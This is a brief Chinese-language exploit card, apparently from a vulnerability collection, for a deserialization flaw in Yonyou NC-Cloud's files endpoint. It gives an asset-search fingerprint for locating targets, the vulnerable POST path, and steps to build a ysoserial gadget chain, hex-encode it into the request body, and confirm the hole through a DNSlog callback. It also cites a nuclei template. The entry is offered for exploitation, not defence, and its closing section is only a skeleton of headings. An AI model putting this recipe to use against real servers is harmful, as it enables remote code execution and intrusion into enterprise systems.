# 用友NC-Cloudfiles存在反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /fs/service/default/files/ HTTP/1.1`

**请求体 / payload**
```
1. 用yakit生成dnslog域名
2. 使用yso生成利用链
3. 将上一步生成的hex数据替换payload字段，探测是否存在漏洞
Host: {hostname}
Content-Length: 1354
{{hexd(payload)}}

nuclei脚本\
\[用友-nc-cloud-files-反序列化.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友NC-Cloud files存在反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC-Cloud